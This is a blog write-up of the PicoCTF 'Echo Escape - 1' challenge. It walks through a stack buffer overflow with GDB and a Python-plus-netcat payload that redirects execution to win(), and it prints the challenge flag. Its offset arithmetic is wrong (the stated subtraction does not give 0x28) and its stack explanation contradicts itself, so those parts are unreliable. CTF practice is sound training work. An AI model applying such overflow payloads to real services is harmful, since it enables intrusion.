---
layout: post
title: "Echo Escape - 1 Write-up (PicoCTF)"
description: "A step-by-step PicoCTF buffer overflow write-up: analyzing 64-bit stack frames in GDB, calculating buffer offsets, and overwriting saved RIP to execute win()."
tags: [CTF, PicoCTF, Binary Exploitation, Buffer Overflow, GDB, Pwn, C]
category: security
image: https://nirusaki.me/assets/img/og/home.png
---

Hello guys! So today I am going to explore a new topic named **Buffer Overflow** and I am going to learn how to use it using a CTF in CyLabs named PicoCTF... So gear up, we are getting into it!

![Hacker Cat](https://media.tenor.com/Y1aMKkpzZFkAAAAM/hacker-cat.gif)

---

### What is a Buffer Overflow?

**Buffer overflow** is when you allow more than $X$ amount of bytes to some variable.

For example:
```c
char a[32]; // this can store up to 32 bytes of data
```

If we try to write over 32 bytes of data, C won't stop you — it will overwrite the existing data to create extra space (until a stack overflow occurs).

Here I am solving **Echo Escape - 1** of PicoCTF.

---

### Step 1: Downloading the Target Binary & Source

Firstly, download the binary and code from the source using `wget`:

```bash
wget https://challenge-files.picoctf.net/c_mysterious_sea/25149d0d231a925915702d90ffccec8dffb62f25c87c0c1684d5f0710ac1dbd3/vuln
wget https://challenge-files.picoctf.net/c_mysterious_sea/25149d0d231a925915702d90ffccec8dffb62f25c87c0c1684d5f0710ac1dbd3/vuln.c
```

---

### Step 2: Understanding the Exploitation Flow

So how is this going to work? What happens when the function starts / ends??

![Mr Robot Hacking](https://media.tenor.com/OQF2CQfjiG8AAAAC/mr-robot.gif)

The function executes all the statements, then returns back to the caller (yes, I think the `main` function is called). It also has a return address. So in the current stack frame, if we fill the buffer gap between the array and the return address and overwrite the return address to the `win()` function, when it returns, it will end up executing the `win()` function instead! This is how the function works at a lower level.

#### Stack Layout & Payload Diagram

```text
+-------------------------------------------------------+
|  buf[32] Array (Buffer)       [0x7fffffffe2c0]        |  <-- $rbp - 0x20
+-------------------------------------------------------+
|  Saved RBP / Stack Padding    [8 bytes]               |
+-------------------------------------------------------+
|  Return Address (Saved RIP)   [0x7fffffffe238]        |  <-- Overwritten to &win()
+-------------------------------------------------------+

Offset Calculation:
  0x7fffffffe2c0 - 0x7fffffffe238 = 0x28 (40 bytes total)

Payload Assembly:
  [ 'A' * 40 bytes ] + [ 0x401256 (win() in Little-Endian) ]
```

---

### Step 3: Debugging with GDB & Finding Addresses

So we load the binary into the GDB debugger:

![Matrix Code](https://media.tenor.com/72Cg38bV_tYAAAAM/matrix-coding.gif)

```bash
gdb ./vuln
```

Disassemble the `main` function to check buffer allocation:

```gdb
gdb disassemble main
```

As you can see, `$rbp-0x20` — `0x20` represents 32 bytes, hence it is allocating 32 bytes.

Now set a breakpoint on line 25 of `main`:

```gdb
gdb b *main+25
gdb run
```

Now run the program, enter something, and inspect:

```gdb
p/x &win
```
*(This will return a pointer to the `win` function)*

This is the address of `win` which we need to overwrite onto the return address:
```text
0x401256  <-- Target Address for win()
```

Now we need to find the address of the `buf` array:

```gdb
p/x $rbp-0x20
```
This is the address to the `buf` internal pointer variable: `0x7fffffffe2c0`.

Use `info frame` to get the return address. Since it is calculated before the breakpoint, the breakpoint adds a new return address at the specified position: `0x7fffffffe238`.

Subtract these two to get the offset:
```text
0x7fffffffe2c0 - 0x7fffffffe238 = 0x28 (40 bytes)
```

---

### Step 4: Constructing & Launching the Exploit Payload

Generate 40 bytes of random payload, then append the `win` function address, and then pipe it into the remote server:

```bash
nc mysterious-sea.picoctf.net 58714
```

#### Exploit Execution & Terminal OCR Log

![Exploit Terminal Capture](/assets/img/posts/echo-escape-1-terminal.png)

**Terminal Output (OCR Extracted):**

```text
[ ~/Downloads                                                     ✘ 0|SEGV ⚙ 11:29:43 PM
❯ python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q", 0x401256))' | nc mysterious-sea.picoctf.net 58714
Welcome to the secure echo service!
Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV@
Thank you for using our service.
picoCTF{3ch0_s3rv1c3_br34k5_e859590c}%
```

#### Exploit One-Liner Breakdown

```python
python3 -c 'import struct,sys; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q", 0x401256))' | nc mysterious-sea.picoctf.net 58714
```

This multiplies `b"A"` (which is one byte) by 40 to create 40 bytes of padding, and then appends `struct.pack("<Q", 0x401256)` in Little-Endian 64-bit byte order. And we are done! Then just pipe it through `netcat` on the given server address and port number.

![Flag Captured](https://media.tenor.com/XtDTW3LFxdYAAAAM/hacker-cyber.gif)

![Mission Passed](https://media.tenor.com/MbYw4kRu0E0AAAAd/gta-gta-san-andreas.gif)

---

Goodbye, see you later!  
**Nirusaki signing out.**

![Sayonara](https://media.tenor.com/Lh26WPaDUk4AAAAM/goodbye-wave.gif)
